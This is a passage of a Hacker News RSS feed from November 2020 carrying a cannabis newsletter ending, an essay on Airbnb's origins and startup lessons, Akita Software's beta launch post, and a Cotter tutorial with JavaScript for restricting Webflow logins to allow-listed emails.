src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faab6ddb0-7d5b-42c9-9310-3a4472738a2b_1328x747.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/aab6ddb0-7d5b-42c9-9310-3a4472738a2b_1328x747.png&quot;,&quot;height&quot;:747,&quot;width&quot;:1328,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1461029,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h4><strong>4.</strong> We stand on the shoulders of giants</h4><p>Sometimes we have to look to the the past to understand the future. </p><p>To understand the future of the cannabis industry I personally think it’s essential to understand the path that has brought us to where we are today. </p><p>This path has been paved by activists who’s endless passion for this amazing plant has ensured that the draconian policies our politicians have sought to implement don’t prevail, and that those who need access to cannabis will be provided that access. </p><p>Their is also a long list of researchers to thank for providing the cannabis industry with the evidence that it needed to fights its case in court to prove that cannabis is not the cause of many modern problems, rather the solution. </p><h4><strong>5.</strong> An enormous regulatory burden </h4><p>Regulations, regulations, regulations. </p><p>As someone who operates a cannabis business, operating in the industry is by no means an easy challenge as it requires a level of attention to detail that adds on significant costs to cannabis companies who choose to operate in the legal market.</p><p>In the long run I personally think it’s inevitable that the legal industry will overtake the existing legacy markets that exist around the world today through cheer innovations, of which their is no shortage on the horizon.</p><p>In the meantime all cannabis operators will have to operate within a high fragmented regulatory environment that will make it harder to expand into new markets at the rate which perhaps many would would like to, however, many are already paving the way. </p><h4><strong>A final word.</strong></h4><p>In an industry whereby the only constant is change, it’s abundantly clear that the cannabis industry will undergo many additional changes in the coming years.</p><p>Courtesy of being a member of this community, my aim is to provide you with the most up to date information to allow you to understand all of the complexity that is the cannabis industry.</p><p>If learning about this billion industry is something of interest to you then sign up now so you don’t miss the first issue which will be published Saturday the 17th of October 2020. Did I mention that it’s free for the first 1,000 members? </p><p>- Matthew O’Brien</p><p>👉&nbsp;If you enjoyed reading this post, feel free to share it with friends!  </p><p data-attrs="{&quot;url&quot;:&quot;https://fourpm.substack.com/?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share 4 PM&quot;,&quot;class&quot;:null}"><a href="https://fourpm.substack.com/?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share 4 PM</span></a></p><p>… For more like this, make sure to sign up here:  </p></div></div>]]>
            </description>
            <link>https://www.fourpm.co/p/cannabis-is-the-most-misunderstood</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061784</guid>
            <pubDate>Wed, 11 Nov 2020 19:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notion Timeline View]]>
            </title>
            <description>
<![CDATA[
Score 309 | Comments 183 (<a href="https://news.ycombinator.com/item?id=25061781">thread link</a>) | @AlphaWeaver
<br/>
November 11, 2020 | https://www.notion.so/guides/timeline-view-unlocks-high-output-planning-for-your-team | <a href="https://web.archive.org/web/*/https://www.notion.so/guides/timeline-view-unlocks-high-output-planning-for-your-team">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/guides/timeline-view-unlocks-high-output-planning-for-your-team</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061781</guid>
            <pubDate>Wed, 11 Nov 2020 19:15:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On solving your own tiny annoyances]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061753">thread link</a>) | @rjyoungling
<br/>
November 11, 2020 | https://www.younglingfeynman.com/essays/airbnb2 | <a href="https://web.archive.org/web/*/https://www.younglingfeynman.com/essays/airbnb2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-8f03ceb2cec309b9bc66"><div><p><em>EDIT: I’m gonna open this essay up with the caveat that there’s a lot of non-Airbnb stuff in here. That’s because I wanted to draw parallels between Airbnb and other startups. I’m less interested in lazily inspiring you with examples like most sites do, and more in what you should take away to increase your probability of success.</em></p><p><em>I’ve also decided to split the original essay up into 4 parts (shipping 1 part each day). It was almost half an hour long and I feel like that just would’ve been too cumbersome to consume.</em></p><p><em>Hope you enjoy.</em></p><p><em>RJ</em></p><p><em>Links to the rest of the good stuff:</em></p><p><a href="https://www.younglingfeynman.com/essays/airbnb"><em>The Dumbest Startup That Ever Worked  — What You Can Learn From Airbnb  — PART 1</em></a></p><p><a href="https://www.younglingfeynman.com/essays/airbnb2"><em>The Dumbest Startup That Ever Worked  — What You Can Learn From Airbnb  — PART 2</em></a></p><p><a href="https://www.younglingfeynman.com/essays/airbnb3" target="_blank"><em>The Dumbest Startup That Ever Worked  — What You Can Learn From Airbnb  — PART 3</em></a></p><p><a href="https://www.younglingfeynman.com/essays/airbnb4" target="_blank"><em>The Dumbest Startup That Ever Worked  — What You Can Learn From Airbnb  — PART 4</em></a></p><p><em>TLDR: Lesson 1: It’s possible for you to make things better. Lesson 2: Solve your own tiny problem. Lesson 3: Validate quickly and double down when it works. Lesson 4: It’s easy to connect the dots ex-post-facto. Lesson 5: Finding product/market fit from day one is fiction.</em></p><p><em>We’ll cover lessons 2 and 3 today. Let’s get this show on the road, yes?</em></p><p>When Brian moved to SF and decided to live with Joe to figure out what their billion-dollar startup was gonna be, he quickly learned that in order to make rent in SF, you have to sell a kidney. Probably both if you’re one of those fancy, pampered types that enjoys the finer things in life such as, you know, nutrition.</p><p>He didn’t have his part of the rent though ($1150).</p><p>But that weekend, there just so happened to be <a href="https://www.sxsw.com/news/2016/sxsw-eco-award-winners-and-conference-highlights/" target="_blank">an international design conference at SXSW</a>, and they noticed that all the hotels on the website were listed fully booked.</p><p>They figured: well, designers are gonna have to stay somewhere, we don’t have the money to make rent, so what if we made a makeshift Bed and Breakfast?</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603187267518_29128"><div><p>But Brian and Joe didn’t have any beds. However, Joe had some airbeds leftover from camping so they changed their idea to an Airbed and Breakfast (Airbnb).</p><p>They ended up hosting a 35yr old woman from Boston, a 45yr old father of 5 from Utah, and a <a href="https://nextshark.com/meet-man-became-airbnbs-first-guest/" target="_blank">30yr old man from India</a>. Oh… and they made rent.</p><p><em>If you just want to read about Airbnb, skip the following section and pick back up at: BUILD SOMETHING SMALL THAT YOU WANT AND THINK IS DOPE.</em></p><p><strong>Notice that they weren’t trying to build a unicorn</strong>. They just needed to make rent and it seemed like a cool, fun thing to try.</p><p>This is a surprisingly common theme in startups. Travis made a similar remark about the origins of Uber:&nbsp;</p><blockquote><p>‘’When we first started it wasn’t about taking over the world. It wasn’t about taking on corruption in every city around the world. It was actually just about being baller in San Francisco.’’</p></blockquote><p><em>Because literally every POS article on Business Insider type websites doesn’t have the accurate quote and more annoyingly can’t be bothered with a source either, here it is:</em></p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603187267518_32526"><div><p><em>Travis Kalanick at Startup School 2012 (2 years after founding Uber).</em></p><p>Back when computers were expensive, Woz built his own because he wanted one for himself. That was the origin of Woz, Jobs, and for 12 days Wayne’s, Apple.</p><blockquote><p>‘’I had no idea that I was taking exactly the right steps up this nice smooth ladder that leads up to the Apple II.’’</p></blockquote><p>Notice the nice smooth ladder he’s talking about. You start small and incrementally work your way up. You don’t start with the vision of the trillion-dollar Apple we have today.</p><blockquote><p>‘’I told my father: ‘Someday, I’m gonna own a 4K Nova Computer, so I can write programs.’ And he said: ‘That’ll cost as much as a house.’ And I said: ‘I’ll live in an appartment.’ I would rather have a computer in my life than a house.’’&nbsp;</p></blockquote></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603187267518_36039"><div><blockquote><p>‘’I was giving away the schematics, passing them out. No copyright notices, no nothing. Passing out the listings of the code I wrote to other people in my club [<a href="https://en.wikipedia.org/wiki/Homebrew_Computer_Club" target="_blank">The Homebrew Computer Club</a>]. I was saying: ‘Here, you can build your own.’ And nobody really had the time to build it. And, so Steve Jobs came by and said: ‘Why don’t we make a PC board to save them the time to build it.’</p></blockquote></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603187267518_38102"><div><p>There’s this idea that in order to change the world you have to start with the vision to cure cancer or build a quantum computer or something.</p><p>I don’t really like that approach. Maaaybe it’s useful for a second-time founder but for a first-time founder, I think it’s way too overwhelming.</p><p>When you’re ambitions are so grandiose, it’ll scare you into inaction.</p><p>We know from BJ Fogg’s work (2009) on behavior science that if ability is low (something is extremely hard to do), then even with high levels of motivation, behavior won’t occur. And reminders (called prompts) will just make you frustrated.&nbsp;</p><p>But there’s another problem too. Namely, there are just so many examples of solutions to tiny irritations that escalate into big companies.</p><p>There are a few reasons for that but one of them is that it brings clarity, simplicity, and focus. My favorite example of this is The Point vs. Groupon. [4]</p><p>So be open to solving small problems in your life. Yesterday I saw Mikael Cho, founder of Unsplash talk about this on Twitter. It’s a good reminder that small stuff really can become big.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603187267518_48211"><div><p>And if after that you’re still inspired to tackle the hard and obvious problems, you’ll be in a much more favorable position. [5]</p><p>They went from idea to execution fast. There was no complex infrastructure. No complicated back-end designed to handle the influx of millions of people. No, it was all very ghetto. We need to pay the rent, so can we get 3 people to <a href="https://nextshark.com/meet-man-became-airbnbs-first-guest/" target="_blank">pay us $80</a> to stay with us and sleep on our Airbeds during the conference?</p><p>Most of the time when founders do that stuff, it’s just another way to hide.</p><p>One of the best models we have today is the <a href="https://okdork.com/resources/validate-business/" target="_blank">Kagan Validation Model</a>: Get 3 paying customers in 48 hours without spending any money. (Sumo Group founder and early Facebook/Mint employee <a href="https://www.youtube.com/c/OkDork" target="_blank">Noah Kagan</a>.)</p><p>Sure, that might eliminate ideas that would’ve worked had you spend more resources (false negatives). But it also prevents you from spending months or even years on ideas that are never gonna work (false positives).&nbsp;</p><p>Since the latter is a far more common problem, it’s more important to prevent that from happening.</p><p>By making the system overly sensitive, you’ll prevent wasting resources on ideas that’ll never work and the stuff that does make it through your filter is much more likely to succeed.</p><p>Think about it. If you can presell something based on a phone call then that leaves all the tools in your toolbox available to grow it. Whereas if you launch with the perfect product and marketing after years of refining it behind closed doors, then where exactly are you gonna take it from there? What’s left to optimize?</p><p>This does beg the question: ‘‘Why make the system overly sensitive in the first place? Why not adjust it so it’s perfect?’’ Because that’s not possible. There’s no way to create a system that will sort good ideas from bad ideas perfectly. So you’ll always have to be biased toward identifying good ideas and throwing away good ones that seemed bad (false negative) or identifying bad ideas and continuing to work on bad ideas that seem good (false positives).</p><p><em>This essay </em><a href="https://www.younglingfeynman.com/essays/paradigm" target="_blank"><em>Paradigm Shift: Drastically Increase The Odds of Success</em></a><em> goes into depth on how to think about false positives and negatives.</em></p><p><em>[4] From </em><a href="https://www.younglingfeynman.com/essays/startstartup" target="_blank"><em>The Right Way To Start A Startup</em></a><em>:</em></p><blockquote><p>Andrew at the NY Tech Meetup in 2008:</p><p>‘’The biggest mistake we made with The Point was being encumbered by this vision of what I wanted it to be. And taking 10 months to build the product and making all these assumptions of what people would want, that we then spend the next 10 months backtracking on. Instead of focussing on the one little piece of the product that people actually liked. </p><p>So, uhm, If there’s any advice that I have it’s you’re way too dumb to figure out if your idea is any good. It’s up to the masses. So build that very small thing and get it out there and keep on trying different things and eventually you’ll get it right.’’</p></blockquote><p><em>[5] Elon Musk is a role model for many founders nowadays but what he’s doing now is much less accessible than what Jack Dorsey, Drew Houston, or Mark Zuckerberg have done. In fact, it was so inaccessible that he couldn’t raise enough from investors. Which is why half a billion dollars in loans from the government was required. As for the hundreds of millions to kickstart Tesla and SpaceX? His own money. Which he made from… yup… internet startups. His first project was a small video game called Blastar. After that, he created Zip2 (Internet version of the yellow pages telephone directory with maps included.), then PayPal.</em></p><p><em>Also, SpaceX grew in ambition. Originally </em><a href="https://en.wikipedia.org/wiki/History_of_SpaceX#cite_note-1"><em>the idea</em></a><em> was just to use 100 of the 180 million dollar payout of the PayPal acquisition to eBay, to get people excited about space again. He wanted to land a miniature experimental greenhouse containing seeds with dehydrated gel on Mars to grow plants on Martian soil, “so this would be the furthest that life’s ever traveled” in an attempt to regain public interest in space exploration and increase the budget of NASA.</em></p><p><em>As for Tesla, that wasn’t even founded by Elon. Which most founders know but gen. pop. or the up and coming founder might not. The </em><a href="https://www.wired.com/2009/06/tesla-founder/" target="_blank"><em>original idea</em></a><em> came from AC Propulsion where Tom Gage and Alan Cocconi had built </em><a href="http://www.discoverychannel.co.uk/video/future-cars-t-zero/" target="_blank"><em>the t zero</em></a><em>.</em></p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603187267518_53941"><div><p><em>Point is, he didn’t start with his current vision and you shouldn’t either.</em></p><p>Berkeley Haas. (2008). <em>Steve Wozniak on the Early Days of Apple [Video]. </em>Retrieved 20 October 2020, from https://youtu.be/5WBX6SACViI.</p><p>Dang, L., &amp; General, R. (2016).&nbsp;<em>Meet the Man Who Became Airbnb's Very First Guest</em>. NextShark. Retrieved 20 October 2020, from https://nextshark.com/meet-man-became-airbnbs-first-guest/.</p><p>Fogg, BJ. (2009).<em> </em>A behavior model for persuasive design. <em>Persuasive ’09: Proceedings Of The 4Th International Conference On Persuasive Technology</em>, <em>40</em>, 1–7. <a href="https://d1wqtxts1xzle7.cloudfront.net/36817028/Behavior-Model-for-Persuasive-Design.pdf?1425238284=&amp;response-content-disposition=inline%3B+filename%3DBehavior_Model_for_Persuasive_Design.pdf&amp;Expires=1602589095&amp;Signature=KPddqP810HPTN~SZLDPWhUoEbIIz7rKXZmSs6MVnhCNnTISRH6k60ORCxlQfh8WphZtdJtu85lxVfbuneBEPDVfDlWS7tD8UNBn3Y5YpqvS5TjiQ3c0h9gcHWG00op6Fl5wmABWosDACoudSqS-9p471kocL7es~kQLdvan5FLVH7boNVWk7rS9QOBNU67k95h7Xl1xg1YasOC43BbLs4qeVzNeuZ-mOR7i32gtScEOWvu97ODs48SYSFSmdpXUFaap~Nln2ICvLEsCYdRbs3RN1toGCRHAsuwl1MBUKq8aZxMEKPBn3YCadIiBfwzWGaWuGKCj1ya1cIdrZVhXUSg__&amp;Key-Pair-Id=APKAJLOHF5GGSLRBV4ZA" target="_blank"><em>https://doi.org/10.1145/1541948.1541999</em></a></p><p>FORA.tv. (2014).<em> Steve Wozniak Remembers Building the First Apple Computer. </em>Retrieved 20 October 2020, from …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.younglingfeynman.com/essays/airbnb2">https://www.younglingfeynman.com/essays/airbnb2</a></em></p>]]>
            </description>
            <link>https://www.younglingfeynman.com/essays/airbnb2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061753</guid>
            <pubDate>Wed, 11 Nov 2020 19:12:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Source Code Is Not the Whole Story: Understanding Software Through APIs]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061745">thread link</a>) | @jeanyang
<br/>
November 11, 2020 | https://www.akitasoftware.com/blog/2020/11/10/kbgnmpu9bdi6qsgkkxo1amqptellna | <a href="https://web.archive.org/web/*/https://www.akitasoftware.com/blog/2020/11/10/kbgnmpu9bdi6qsgkkxo1amqptellna">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-0b8680fe602586cc73eb"><div><p>👋 hunters!</p><p>After putting out an early iteration a few months ago, we’re excited to officially launch our private beta—and to make our docs public for the first time!</p><p>And we'd like to give a big thank-you to all the users and friends of Akita who got us here. 😊<br></p><h2><strong>🚗 How we got here</strong></h2><p>In 2018, I was a <a href="http://jeanyang.com/">CS professor at Carnegie Mellon University</a>. When Cambridge Analytica hit, I started asking friends in industry how they knew what data their apps were sending around. It turned out that there was no good solution for understanding interactions across APIs—not just for privacy and security but also for reliability and diagnostics. When I realized that this was the exact problem I’d been teeing up to solve, I took leave from my job, sold my furniture, and drove across the country to start Akita.</p><p>There is now a small team of us working on Akita, coming from places like Twilio and Amazon. Our team’s experience building in service-oriented environments made everyone especially excited to build a product that would help developers move faster together.</p><h2><strong>🔎 Source code isn’t the whole story.</strong></h2><p>At Akita, we believe the way to understand your software is through your APIs. Our solution builds dynamic models of API behavior to automatically:</p><p>✅Catch breaking changes on every pull request<br>✅Generate specs for any API<br>✅Update API specs on every pull request<br>✅Discover and document endpoints</p><h2>🏗 <strong>How we built it</strong></h2><p>From the beginning of Akita, I knew where I wanted us to go: automatically map out the graph of API interactions. This would be key to improving reliability, diagnostics, and security in modern web apps.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605055841399_25008"><div><p>What we didn’t know was exactly how we would get there. Should we integrate with a tracing library? Should we build a proxy?</p><p>After <a href="https://blog.sigplan.org/2020/10/27/whats-the-role-of-developer-experience-in-programming-languages-research/">talking with dozens of developers and engineering leaders</a>, we came up with three main requirements. First, whatever we built needed to work with any tech stack. Second, people needed to be able to integrate our solution in minutes. Finally, we wanted something that could run in production without adding overhead or exposing sensitive data. These were not easy requirements to balance!</p><p>After over a year of building, we’re super excited to launch a solution that requires no code changes, no proxies, works with any language, and integrates in just minutes. Akita works by watching API traffic, analyzing, and sanitizing the traffic locally to share only metadata back to our cloud. This means you can Akita deploy Akita anywhere: your laptop, CI/CD, or production—without having to worry about us seeing your data. We are really proud of our approach and believe it is the future of cloud observability.</p><p>And for those who are curious, our tech stack is Go, typed Python, and React. 😊</p><h2><strong>💖 Let’s make software development better</strong></h2><p>We believe that Akita can help anybody with a web app who wants to move quickly without losing customers. We understand that we have a long way to go to achieve the vision—and that the only way to get there is by getting feedback early and often from people like you.</p><p>We’d love to have you <a href="https://www.akitasoftware.com/get-invite?utm_campaign=2020_private_launch&amp;utm_medium=blog&amp;utm_source=2020_11_11_producthunt">try out the private beta</a>! We’ll also be checking the comments on <a href="https://www.producthunt.com/posts/akita-private-beta">ProductHunt</a> for feedback and questions. We look forward to hearing from you.</p><p>Onward ⚡️,<br>Jean Yang (<a href="https://www.linkedin.com/in/jean-yang-96575030/">LinkedIn</a>; <a href="https://twitter.com/jeanqasaur">Twitter</a>)<br>Founder and CEO, Akita Software</p><p>P.S. Thank you to the veterans out there!<br>P.P.S. Follow our updates and tell us what you think on Twitter <a href="https://twitter.com/AkitaSoftware">@AkitaSoftware</a>!</p></div></div></div>]]>
            </description>
            <link>https://www.akitasoftware.com/blog/2020/11/10/kbgnmpu9bdi6qsgkkxo1amqptellna</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061745</guid>
            <pubDate>Wed, 11 Nov 2020 19:12:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cotter – Restrict Login to “Allowed” Emails Only, No Code]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25061724">thread link</a>) | @mmarcelline
<br/>
November 11, 2020 | https://blog.cotter.app/how-to-restrict-your-webflow-website-to-allowed-emails-only/ | <a href="https://web.archive.org/web/*/https://blog.cotter.app/how-to-restrict-your-webflow-website-to-allowed-emails-only/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<div>
<figure><iframe width="480" height="270" src="https://www.youtube.com/embed/w9kJyBDcm9w?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h3 id="prerequisites">Prerequisites</h3><p>Before we begin, make sure you have done the following:</p><ul><li><strong>Follow Cotter's Basic Webflow Tutorial</strong>: <a href="https://blog.cotter.app/integrate-cotter-magic-link-to-webflow-in-less-than-15-minutes/">How to Integrate Cotter's Magic Link to Your Webflow Site in Less Than 7 minutes</a></li></ul><h3 id="how-it-works">How it works</h3><p>We'll have 3 pages in this tutorial: <strong>A Waitlist Page (/waitlist), a Login Page (/), and a Protected Page (/protected)</strong>. </p><p>Users can sign up to the waitlist by entering their email on the Waitlist Page. You can manage people on the waitlist in your Google Sheets. Only people who are marked as <code>Allowed: TRUE</code> on the waitlist can login to your website using the Login Page and access the Protected Page.</p><p>In this tutorial,<strong> we'll make the Waitlist Page, </strong>and then<strong> update the Login and Protected Page </strong>that you have made in the prerequisite tutorial<strong>.</strong></p><h2 id="make-a-waitlist-page">Make a Waitlist Page</h2><h3 id="step-1-set-up-google-sheets">Step 1: Set up Google Sheets</h3><p>Go to <a href="https://cotteremaillist.herokuapp.com/">https://cotteremaillist.herokuapp.com</a> to connect your Google Sheets that contains a list of emails and follow the instructions there. See an <a href="https://docs.google.com/spreadsheets/d/1EYaErpQUCOhfXgCb0vhObEwDMFBqi_-gmRJ8C7DcOAA/edit?usp=sharing">example Google Sheet here.</a> (You can make this sheet private - you just need to connect your Google Account in the website above).</p><h3 id="step-2-make-elements-to-show-the-waitlist-email-form-and-a-success-message">Step 2: Make elements to show the waitlist email form and a success message</h3><ul><li>Include a section element to load Cotter's login form. <strong>We need to set that section id "cotter-form-container"</strong>.<strong> </strong>Make the section <strong>width </strong>and<strong> height </strong>to<strong> <code>300px</code> </strong>for best results.</li><li>Include a text element with <strong>id "waitlist-message"</strong>. We will show if the email is successfully added to the waitlist here.</li></ul><h3 id="step-3-add-cotter-js-sdk">Step 3: Add Cotter JS SDK</h3><p>After finishing the page setup we can start with adding custom code to the Waitlist Page. Copy paste the code below to the custom code tab on the Waitlist Page settings.</p><figure><img src="https://blog.cotter.app/content/images/2020/11/image-4.png"><figcaption>Waitlist Page Settings</figcaption></figure><figure><img src="https://blog.cotter.app/content/images/2020/11/image-5.png"><figcaption>Scroll Down to "Custom Code" section</figcaption></figure><p>Add the code below to the <strong>head</strong> of Waitlist page:</p><pre><code>&lt;!--Get Cotter JS SDK--&gt;
&lt;script
  src="https://unpkg.com/<a href="https://blog.cotter.app/cdn-cgi/l/email-protection" data-cfemail="f6959982829384b6c6d8c5d8c4c5">[email&nbsp;protected]</a>/dist/cotter.min.js"
  type="text/javascript"
&gt;&lt;/script&gt;</code></pre><h3 id="step-4-add-a-function-to-insert-email-to-your-google-sheets">Step 4: Add a function to insert email to your Google Sheets</h3><p>Make sure you have already done Step 1 by going to <a href="https://cotteremaillist.herokuapp.com/">https://cotteremaillist.herokuapp.com</a> and connecting your Google Sheets that contains the waitlist (this can be empty, but make sure you follow the format specified).</p><p>Add the code below to the <strong>body</strong> of Waitlist page:</p><pre><code>&lt;script&gt;
  const insertEmail = async (payload) =&gt; {
    try {
      const body = {
        spreadsheetId: "&lt;YOUR SPREADSHEET ID&gt;", //👈 Add your Spreadsheet ID
        apiKeyID: "&lt;YOUR API KEY ID&gt;", //👈 Add your API KEY ID
        email: payload.email,
        allowed: false // By default, new emails are not allowed to login
      };
      let resp = await fetch(
        "https://cotteremaillist.herokuapp.com/api/insertemail",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(body)
        }
      );
      let respBody = await resp.json();
      if (respBody.success) {
        document.getElementById("waitlist-message").innerHTML =
          "Added to waitlist";
      } else {
        document.getElementById("waitlist-message").innerHTML =
          "Something went wrong";
      }
    } catch (e) {
      document.getElementById("waitlist-message").innerHTML =
        "Something went wrong";
    }
  };
&lt;/script&gt;</code></pre><p>Make sure that you have pasted your<strong> <u>Spreadsheet ID</u> </strong>and your<strong> <u>API Key ID</u> </strong>on the code block above.</p><p>You can grab a Cotter API Key ID by visiting <a href="https://dev.cotter.app/">https://dev.cotter.app</a> and creating an account. Once you have created an account, make sure to create a new project and grab the API Key ID.</p><h3 id="step-5-add-the-code-below-to-show-the-email-form-join-waitlist-form-">Step 5: Add the code below to show the email form ("Join Waitlist" form)</h3><p>Below the code on step 4, add this code:</p><pre><code>&lt;script&gt;
    var cotter = new Cotter({
      ApiKeyID: "&lt;YOUR_API_KEY_ID&gt;",  // 👈 Specify your API KEY ID here
      ButtonText: "Join Waitlist",
    });
    cotter
      .signInWithLink() // Verify email with Magic Link
      .showEmailForm() // Send Magic Link via email
      .then((payload) =&gt; {
        insertEmail(payload);
      })
      .catch((err) =&gt; {
      // handle error
      });
&lt;/script&gt;</code></pre><p>Make sure that you have pasted your<strong> <u>API Key ID</u> </strong>on the code block above.</p><h2 id="login-page-setup-where-the-login-form-will-show-up-">Login Page Setup (where the login form will show up)</h2><p>You should already have a Login Page after following the prerequisite tutorial above. Only users who are allowed in your Google Sheets can login. We are going to modify and add some of the necessary code.</p><h3 id="step-1-add-the-code-below-to-the-body-of-the-login-page">Step 1. Add the code below to the body of the Login Page</h3><p>Add this code before you Initialize Cotter</p><pre><code>&lt;script&gt;
  const checkEmail = async (payload) =&gt; {
    try {
      const body = {
        spreadsheetId: "&lt;YOUR SPREADSHEET ID&gt;", //👈 Add your Spreadsheet ID
        apiKeyID: "&lt;YOUR API KEY ID&gt;",  // 👈 Specify your API KEY ID here
        email: payload.identifier
      };
      let resp = await fetch(
        "https://cotteremaillist.herokuapp.com/api/checkemail",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(body)
        }
      );
      let respBody = await resp.json();
      if (!respBody.allowed) {
        return "You are not allowed to log in";
      } else {
        return null;
      }
    } catch (e) {
      console.log(e);
      return "You are not allowed to log in";
    }
  };
&lt;/script&gt;</code></pre><p><strong>Make sure that you have pasted your <u>Spreadsheet ID</u> and your <u>API Key ID</u> on the code block above.</strong></p><h3 id="step-2-change-the-code-in-the-body-of-the-login-page-to-the-code-below">Step 2. Change the code in the body of the Login Page to the code below</h3><pre><code>&lt;script&gt;
  var cotter = new Cotter("&lt;YOUR_API_KEY_ID&gt;"); // 👈 Specify your API KEY ID
  cotter
    // Choose what method of login do you want
    // Sign In with Magic Link
-   .signInWithLink()
+   .signInWithLink(checkEmail)
    // Send Magic Link via email
    .showEmailForm()
    
    .then(payload =&gt; {
      // redirect to the protected page
      window.location.href = "/protected";
    })
    .catch(err =&gt; {
      // handle error
    });
 &lt;/script&gt;</code></pre><p>Make sure you deleted the line ".signInWithLink()" and added the line ".signInWithLink(checkEmail)".</p><p>Also, make sure that you have pasted your <u>API Key ID</u> on the code block above.</p><h2 id="protected-page-setup-and-any-other-page-you-want-to-protect-">Protected Page Setup (and any other page you want to protect)</h2><p>You should already have a Protected Page after following the prerequisite tutorial above. We are going to modify and add some of the necessary code.</p><pre><code>&lt;script
  src="https://unpkg.com/<a href="https://blog.cotter.app/cdn-cgi/l/email-protection" data-cfemail="c1a2aeb5b5a4b381f1eff2eff3f2">[email&nbsp;protected]</a>/dist/cotter.min.js"
  type="text/javascript"
&gt;&lt;/script&gt;

&lt;script&gt;
  async function checkLoggedIn() {
    //Initialize Cotter
    var cotter = new Cotter("&lt;YOUR_API_KEY_ID&gt;"); // 👈 Specify your API KEY ID
    
    // 1. We check if a user has already logged in
    const accessTokenObject = await cotter.tokenHandler.getAccessToken();
    const accessToken = accessTokenObject ? accessTokenObject.token : null;

    // 2. If user is not logged in then we redirect to the login page
    if (!accessToken) window.location.href = "/";

    // 3. Construct the body for access token verification
    let body = {
      oauth_token: {
        access_token: accessToken
-     } 
+     },
+     spreadsheetId: "&lt;YOUR SPREADSHEET ID&gt;",  //👈 Add your Spreadsheet ID
+     apiKeyID: "&lt;YOUR API KEY ID&gt;" // 👈 Specify your API KEY ID here
    };

    // 4. If user is logged in then we fetch the user data
+   //    and check if the email is allowed based on our Google sheets
-   let url = "https://worker.cotter.app/verify";
+   let url = "https://cotteremaillist.herokuapp.com/api/login"
    fetch(url, {
      method: "POST",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json",
-        API_KEY_ID: "&lt;YOUR_API_KEY_ID&gt;"   // 👈 Specify your API KEY ID here
      },
-     mode: "cors",
      body: JSON.stringify(body)
    })
      .then((resp) =&gt; resp.json())
      .then((data) =&gt; {
        if (!data.success) { window.location.href = "/" }
      });
  }
  
  //Call the CheckLoggedIn function
  checkLoggedIn();
  
&lt;/script&gt;</code></pre><p><strong>Make sure you delete all lines with the "-" symbol and added all lines with the "+" symbol.</strong> (Do not include the <code>+</code> sign itself).</p><p>Also, make sure that you have pasted your <u>Spreadsheet ID</u> and your <u>API Key ID</u> on the code block above.</p><hr><h3 id="questions-feedback">Questions &amp; Feedback</h3><p>Come and talk to the founders of Cotter and other developers who are using Cotter on <a href="https://join.slack.com/t/askcotter/shared_invite/zt-dxzf311g-5Mp3~odZNB2DwYaxIJ1dJA">Cotter's Slack Channel</a>.</p><h3 id="ready-to-use-cotter">Ready to use Cotter?</h3><p>If you enjoyed this tutorial and want to integrate Cotter into your website or app, you can <a href="https://dev.cotter.app/">create a free account</a> and <a href="https://docs.cotter.app/">check out our documentation</a>.</p><p>If you need help, ping us on our <a href="https://join.slack.com/t/askcotter/shared_invite/zt-dxzf311g-5Mp3~odZNB2DwYaxIJ1dJA">Slack channel</a> or email us at <a href="https://blog.cotter.app/cdn-cgi/l/email-protection" data-cfemail="e39786828ea3808c97978691cd829393cd">[email&nbsp;protected]</a></p>
</div>
</section></div>]]>
            </description>
            <link>https://blog.cotter.app/how-to-restrict-your-webflow-website-to-allowed-emails-only/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061724</guid>
            <pubDate>Wed, 11 Nov 2020 19:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gantt Charts Arrive in Notion]]>
            </title>
            <description>
<![CDATA[
